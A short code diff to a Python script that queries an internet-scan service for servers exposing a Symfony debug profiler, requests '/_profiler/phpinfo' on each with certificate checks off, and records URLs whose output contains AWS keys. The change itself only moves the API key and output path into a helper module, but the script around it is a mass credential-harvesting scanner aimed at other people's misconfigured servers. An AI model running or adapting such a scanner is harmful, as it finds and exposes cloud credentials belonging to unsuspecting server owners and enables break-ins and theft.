@@ -14,7 +14,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = '"X-Debug-Token-Link" port:443'
 FILE = "/_profiler/phpinfo"
 session = requests.Session()
@@ -35,7 +41,7 @@ def grab_file (IP,PORT,FILE):
 		response = session.get(URL, headers=headers, timeout=15, verify=False)
 		result = response.text
 		if 'AWS_' in result:
-			text_file = open("./cfg/phpinfo.cfg", "a")
+			text_file = open_output("cfg/phpinfo.cfg", "a")
 			text_file.write(""+URL+"\n")
 			text_file.close()
 			print ("[*] AWS Keys .. Found [*]\n")
